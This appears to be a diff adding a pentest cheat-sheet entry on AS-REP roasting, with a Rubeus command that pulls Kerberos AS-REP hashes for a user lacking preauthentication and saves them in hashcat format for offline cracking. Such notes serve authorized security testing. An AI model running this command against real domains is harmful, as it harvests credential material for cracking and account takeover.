@@ -1,0 +1,4 @@
+ASREProasting
+Check if user has no_preauth_required set 
+
+Using rubeus: asreproast /outfile:\Users\user\hash.txt /format:hashcat /user:mr-user /domain:this.local /dc:dc01.this.local
